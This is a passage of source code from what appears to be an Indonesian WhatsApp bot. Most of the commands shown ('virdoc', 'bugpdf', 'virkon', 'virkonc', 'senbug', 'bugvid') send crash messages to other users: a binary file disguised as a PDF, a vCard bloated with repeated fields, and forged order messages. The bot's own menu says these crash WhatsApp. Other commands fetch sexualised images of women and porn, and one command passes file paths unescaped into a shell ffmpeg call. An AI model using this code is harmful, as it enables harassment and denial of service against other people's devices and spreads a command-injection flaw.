"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
}
}
}})
}
}
break
//=================================================//
//=================================================//
case "bugtag": {
if (!isCreator) return onlyOwner()
if (!m.isGroup) return onlyGroup()
zyren.sendMessage(m.chat, { text : q ? q : "" , mentions: participants.map(a => a.id)}, { quoted: pak })
}
break
//=================================================//
case "virdoc":{
if (!isCreator) return onlyOwner()
anuin = fs.readFileSync("./basetzy/virtex/ngeselin.BIN")
zyren.sendMessage(m.chat, { document: anuin, mimetype: "application/octet-stream", fileName: `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 ${place}.BIN`, title: `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘.BIN` }, { quoted: pak })
}
break
//=================================================//
case "bugpdf":{
if (!isCreator) return onlyOwner()
anuin = fs.readFileSync("./basetzy/virtex/ngeselin.BIN")
zyren.sendMessage(m.chat, { document: anuin, mimetype: "application/pdf", fileName: `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 ${place}.pdf`, title: `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘.pdf` }, { quoted: pak })
}
break
//=================================================//
case "virkon": {
if (!isCreator) return onlyOwner()
           const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘\nitem1.TEL;waid=6281991410940:6281991410940\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}                          		
                zyren.sendContact(m.chat, ownerNumber, `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`, fkontaak)
            }
            break
//=================================================//
case "virkonc": {
if (!isCreator) return onlyOwner()
 const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
zyren.sendContact(m.chat, ownerNumber, `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`, fkontaak)
}
break
//=================================================//
case "jadibug1": {
if (!isCreator) return onlyOwner()
if (!/video/.test(mime) && !/audio/.test(mime)) return setReply(`*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`) 
if (!quoted) return setReply(`*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`) 
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
let audio = await toAudio(media, "mp4")
zyren.sendMessage(m.chat, {audio: audio, mimetype: "audio/mpeg"}, { quoted : pak })
}
break
//=================================================//
case "jadibug2": {
if (!isCreator) return onlyOwner()
if (/document/.test(mime)) return setReply(`*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`) 
if (!/video/.test(mime) && !/audio/.test(mime)) return setReply(`*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`) 
if (!quoted) return setReply(`*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`) 
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
let audio = await toAudio(media, "mp4")
zyren.sendMessage(m.chat, {document: audio, mimetype: "audio/mpeg", fileName: `Convert By ${zyren.user.name}.mp3`}, { quoted : pak})
}
break
//=================================================//
case "jadibug3": {
if (!isCreator) return onlyOwner()
if (!/video/.test(mime) && !/audio/.test(mime)) return setReply(`*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`) 
if (!quoted) return setReply(`*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`) 
onlyWait()
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
let audio = await toPTT(media, "mp4")
zyren.sendMessage(m.chat, {audio: audio, mimetype:"audio/mpeg", ptt:true }, {quoted:pak})
}
break
//=================================================//
case "jadibug4": {
if (!isCreator) return onlyOwner()
if (!quoted) return setReply("Reply Image") 
if (!/webp/.test(mime)) return setReply(`Balas sticker dengan caption *${prefix + command}*`) 
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
let ran = await getRandom(".png")
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
zyren.sendMessage(m.chat, { image: buffer }, { quoted: pak })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case "jadibug5": {
if (!isCreator) return onlyOwner()
if (!quoted) return setReply("Reply Image") 
if (/image/.test(mime)) {
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
zyren.sendMessage(m.chat, {image: {url: media},viewOnce : true},{quoted: pak })
} else if (/video/.test(mime)) {
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
zyren.sendMessage(m.chat, {video: {url: media},viewOnce : true},{quoted: pak })
}
}
break
//=================================================//
case "permisi":
if (!isCreator) return onlyAdmin()
touchmebre = [
{
title: `🔥 𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 🔥 ${buttonvirus} ${buttonvirus}`,
rows: [
{title: buttonvirus, rowId: `asu"+$+$+$+2+#`, description: `Hay Kontol`},
{title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
]
}
]
zyren.sendListMsg(m.chat, `🔥 𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 🔥`, zyren.user.name, `Hay Kak 𝐌𝐲 𝐂𝐡𝐞𝐧𝐞𝐥 Adia Di List`, `Click Here 🔥`, touchmebre, m)
break
//=================================================//
case "senbug":{
if (!isCreator) return onlyOwner()
/*if (!isCreator) return Kalau Mau Self Hapus Aja yang Tanda*/ /* sama */
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
listMessage :{
title: `Silahkan Pilih Bug Yang Anda Inginkan \n\n Name : ${pushname} ${ucapanWaktu}\n Number : ${m.sender.split("@")[0]}\n Status : ${isCreator ? "Owner" : "User"}`,
description: "PERINGATAN!!!",
buttonText: "CLICK DISINI",
footerText: "EFFECT INI MEMBUAT WHATSAPP MENJADI CRASH",
listType: "SINGLE_SELECT",
sections: [{
"title": "Menu Bug",
"rows": [
{
"title": "Bug1",
"description": "Bug Berjenis Quoted Audio",
"rowId": `${prefix}bug1`
}
]
},
{
"title": "Menu Bug",
"rows": [
{
"title": "Bug2",
"description": "Bug Berjenis Foto",
"rowId": `${prefix}bug2`
}
]
},
{
"title": "Menu Bug",
"rows": [
{
"title": "Bug3",
"description": "Bug Berjenis Document",
"rowId": `${prefix}bug3`
}
]
},
{
"title": "Menu Bug",
"rows": [
{
"title": "Bug4",
"description": "Bug Berjenis Group",
"rowId": `${prefix}bug4`
}
]
},
{
"title": "Menu Bug",
"rows": [
{
"title": "Bug5",
"description": "Bug Berjenis Lokasi",
"rowId": `${prefix}bug5`
}
]
},
{
"title": "Menu Bug",
"rows": [
{
"title": "Bug6",
"description": "Bug Berjenis Troli",
"rowId": `${prefix}bug6`
}
]
},
{
"title": "Menu Bug",
"rows": [
{
"title": "Bug7",
"description": "Bug Berjenis Contacts",
"rowId": `${prefix}bug7`
}
]
}
],
listType: 1
}
}), { userJid: m.chat, quoted: ftroli })
zyren.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case "asupan":
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
teks = `Nih Kak >\\<`
buffer = `https://saipulanuar.ga/api/asupan`
zyren.sendMessage(from, {video:{url:buffer}, mimetype:"video/mp4", caption:"Success"}, {quoted:m})
break
//=================================================//
case "asupangheayubi":
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
teks = `Nih Kak >\\<`
buffer = `https://saipulanuar.ga/api/asupan/gheayubi`
zyren.sendMessage(from, {video:{url:buffer}, mimetype:"video/mp4", caption:"Success"}, {quoted:m})
break
//=================================================//
case "asupanrikagusriani":
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
teks = `Nih Kak >\\<`
buffer = `https://saipulanuar.ga/api/asupan/rikagusriani`
zyren.sendMessage(from, {video:{url:buffer}, mimetype:"video/mp4", caption:"Success"}, {quoted:m})
break
//=================================================//
case "ytgoldbuton":
try{
if (!text) return setReply(`Example : ${prefix + command} PakTzy`)
let { data } = await axios.get("https://saipulanuar.ga/api/maker/youtube-gold-button?text=" + encodeURI(text))
zyren.sendMessage(m.chat, { image: { url: data.result }})
} catch {
setReply("Maaf Kak Fitur Sedang Error") 
}
break
//=================================================//
case "iggoldbuton":
try{
if (!text) return setReply(`Example : ${prefix + command} PakTzy`)
let { data } = await axios.get("https://saipulanuar.ga/api/maker/instagram-gold-button?text=" + encodeURI(text))
zyren.sendMessage(m.chat, { image: { url: data.result }})
} catch {
setReply("Maaf Kak Fitur Sedang Error") 
}
break
//=================================================//
case "asupanukhty":
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
teks = `Nih Kak >\\<`
buffer = await fetchJson(`https://saipulanuar.ga/api/asupan/ukhty`)
zyren.sendMessage(m.chat, { video: { url: buffer.result.url }, mimetype: "video/mp4", fileName: `${command}.mp4`, caption: `Nih Asupan Nya` }, { quoted: m })
break
//=================================================//
case "asupanbocil":
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
teks = `Nih Kak >\\<`
buffer = await fetchJson(`https://saipulanuar.ga/api/asupan/bocil`)
zyren.sendMessage(m.chat, { video: { url: buffer.result.url }, mimetype: "video/mp4", fileName: `${command}.mp4`, caption: `Nih Asupan Nya` }, { quoted: m })
break
//=================================================//
case "asupansantuy":
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
teks = `Nih Kak >\\<`
buffer = await fetchJson(`https://saipulanuar.ga/api/asupan/santuy`)
zyren.sendMessage(m.chat, { video: { url: buffer.result.url }, mimetype: "video/mp4", fileName: `${command}.mp4`, caption: `Nih Asupan Nya` }, { quoted: m })
break
//=================================================//
case "hijaber":
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
teks = `Nih Kak >\\<`
buffer = await fetchJson(`https://saipulanuar.ga/api/asupan/hijaber`)
zyren.sendMessage(m.chat, { video: { url: buffer.result.url }, mimetype: "video/mp4", fileName: `${command}.mp4`, caption: `Nih Asupan Nya` }, { quoted: m })
break
//=================================================//
case "cecanindo":
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
teks = `Nih Kak >\\<`
buffer = `https://saipulanuar.ga/api/cecan/indonesia`
zyren.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case "cecanchina":
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
teks = `Nih Kak >\\<`
buffer = `https://saipulanuar.ga/api/cecan/china`
zyren.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case "cecanhijaber":
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
teks = `Nih Kak >\\<`
buffer = `https://saipulanuar.ga/api/cecan/hijaber`
zyren.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case "cecanmalaysia":
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
teks = `Nih Kak >\\<`
buffer = `https://saipulanuar.ga/api/cecan/malaysia`
zyren.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case "cecanthai":
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
teks = `Nih Kak >\\<`
buffer = `https://saipulanuar.ga/api/cecan/thailand`
zyren.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case "cecanvietnam":
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
teks = `Nih Kak >\\<`
buffer = `https://saipulanuar.ga/api/cecan/vietnam`
zyren.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case "cecankorea":
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
teks = `Nih Kak >\\<`
buffer = `https://saipulanuar.ga/api/cecan/korea`
zyren.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case "cecanjepan":
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
teks = `Nih Kak >\\<`
buffer = `https://saipulanuar.ga/api/cecan/japan`
zyren.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case "bokpig":
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
teks = `Nih Kak >\\<`
buffer = `https://saipulanuar.ga/api/bokepig`
zyren.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case "cecan":
if (isBan) return //sticBanLu(from)
if (!quoted) return setReply(`*Ngetik Yg Bener Dek!!* ${prefix + command}`) 
onlyWait()
teks = `Nih Kak >\\<`
buffer = `https://saipulanuar.ga/api/cecan/random`
zyren.sendMessage(from, {image:{url:buffer}, caption:"Done!"}, {quoted:m})
break
//=================================================//
case "bugvid":
if (!isCreator) return onlyOwner()
krt = global.bgv
owned = "6281991410940"
mbc = `${qpeh}`
let qepeh = {
video: krt, 
jpegThumbnail: logonya,
caption: mbc,
fileLength: "1009999999999",
headerType: 4,
contextInfo: {
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": "https://youtube.com/c/PakTzy",
"sourceUrl": "https://youtube.com/c/PakTzy"
}}
}
zyren.sendMessage(m.chat, qepeh, { quoted: {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
remoteJid: "14169948404-1305080833@g.us"
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 1,
message: "𝐏𝐫𝐢𝐝𝐞 - 𝐓𝐳𝐲 ϟ",
orderTitle: "999999999", 
sellerJid: `0@s.whatsapp.net` 
}
}
}})
break
//=================================================//
//=================================================//
case "tiktok":
try{
if (!text) return setReply(`Example : ${prefix + command} https://vt.tiktok.com/ZS82urPBa/`)
if (text.includes("https://vt.tiktok.com/")){
var link = args[0]
} else if (text.includes("https://vm.tiktok.com/")){
var link = args[0]
} else if (text.includes("https://www.tiktok.com/")){
var link = args[0]
} else setReply("Error Link")
let buttons = [{ buttonId: `${prefix}tiktokmp3 ${link}`, buttonText: { displayText: "Audio" }, type: 1 }]
let { data } = await axios.get(`https://saipulanuar.ga/api/download/tiktok?url=${link}`)
zyren.sendMessage(m.chat, { video: { url: data.result.video_original }, mimetype: "video/mp4", caption: mess.success, buttons }, { quoted: m })
} catch {
setReply("Maaf Kak Fitur Sedang Error Silahkan Chat Owner Agar Segera Di Perbaiki") 
}
break
//=================================================//
case "tiktokmp3":
try{
if (!text) return setReply(`Example : ${prefix + command} https://vt.tiktok.com/ZS82urPBa/`)
if (text.includes("https://vt.tiktok.com/")){
var link = args[0]
} else if (text.includes("https://vm.tiktok.com/")){
var link = args[0]
} else if (text.includes("https://www.tiktok.com/")){
var link = args[0]
} else setReply("Error Link")
let { data } = await axios.get(`https://saipulanuar.ga/api/download/tiktok?url=${link}`)
